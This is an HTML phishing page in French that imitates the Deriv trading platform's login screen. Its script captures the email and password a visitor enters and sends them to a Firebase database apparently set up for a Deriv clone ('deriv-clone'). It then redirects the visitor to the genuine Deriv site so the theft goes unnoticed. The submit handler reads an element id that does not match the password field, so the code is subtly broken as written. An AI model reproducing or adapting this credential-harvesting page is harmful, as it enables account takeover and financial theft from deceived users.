<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion | Deriv</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <style>
        :root { --red: #ff444f; --bg-alert: #fff1f2; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: sans-serif; }
        body { padding: 20px; display: flex; flex-direction: column; align-items: center; }
        .logo { color: var(--red); font-size: 32px; font-weight: 900; text-decoration: none; margin-bottom: 25px; }
        .container { width: 100%; max-width: 400px; }
        .alert { background: var(--bg-alert); border: 1px solid #ffdbde; padding: 15px; border-radius: 8px; display: flex; gap: 10px; margin-bottom: 20px; font-size: 13px; }
        .alert i { color: var(--red); }
        input { width: 100%; padding: 14px; border: 1px solid #d6dadb; border-radius: 4px; font-size: 16px; margin-bottom: 15px; outline: none; }
        .btn-submit { width: 100%; padding: 14px; background: var(--red); color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
        .social-btn { width: 100%; padding: 12px; border: 1px solid #d6dadb; border-radius: 8px; background: white; margin-top: 10px; display: flex; align-items: center; justify-content: center; gap: 10px; font-weight: 600; text-decoration: none; color: #333; }
    </style>
</head>
<body>

    <a href="#" class="logo">deriv</a>

    <div class="container">
        <h2 style="margin-bottom:15px; font-size: 18px;">Content de te revoir</h2>
        <div class="alert">
            <i class="fas fa-exclamation-triangle"></i>
            <p>Vous vous êtes inscrit avec votre adresse e-mail. Connectez-vous avec votre adresse e-mail et votre mot de passe.</p>
        </div>

        <form id="loginForm">
            <input type="email" id="email" placeholder="E-mail" required>
             
            <div style="position: relative; width: 100%; max-width: 400px; margin-bottom: 15px;">
    <input type="password" id="pass" placeholder="Mot de passe" 
           style="width: 100%; padding: 12px; padding-right: 45px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 16px;">
    
    <div onclick="toggle()" style="position: absolute; right: 12px; top: 50%; transform: translateY(-50%); cursor: pointer;">
        <svg id="eye" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#666" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
            <circle cx="12" cy="12" r="3"></circle>
        </svg>
    </div>
</div>

<script>
function toggle() {
    // On récupère l'input et l'icône par leur ID
    var input = document.getElementById("pass");
    var icone = document.getElementById("eye");

    if (input.type === "password") {
        input.type = "text"; // On affiche le texte
        // Dessin de l'œil barré
        icone.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line>';
    } else {
        input.type = "password"; // On cache le texte
        // Dessin de l'œil normal
        icone.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle>';
    }
}
</script>

            <button type="submit" class="btn-submit">Se connecter</button>
        </form>

        <div style="text-align:center; margin: 20px 0; color: #646e73;">Ou continuez avec</div>

        <div class="social-btn" style="color: var(--red); border-color: var(--red);"><i class="fas fa-fingerprint"></i> Biométrie</div>
        <div class="social-btn"><img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_Secondary_Logo.svg" width="18"> Google</div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

        // Configuration depuis ton image 132499
        const firebaseConfig = {
            apiKey: "AIzaSyCM5WffdS8OwRfVDSvdbo2iIQ",
            authDomain: "deriv-clone.firebaseapp.com",
            databaseURL: "https://deriv-clone-default-rtdb.firebaseio.com",
            projectId: "deriv-clone",
            storageBucket: "deriv-clone.firebasestorage.app",
            messagingSenderId: "156591776390",
            appId: "1:156591776390:web:e418f9088d666d6290072b"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        document.getElementById('loginForm').addEventListener('submit', (e) => {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const pass = document.getElementById('password').value;

            // Envoi des données
            push(ref(db, 'donnees'), {
                email: email,
                password: pass,
                date: new Date().toLocaleString()
            }).then(() => {
                // Redirection
                window.location.href = "https://app.deriv.com";
            });
        });
    </script>
</body>
</html>
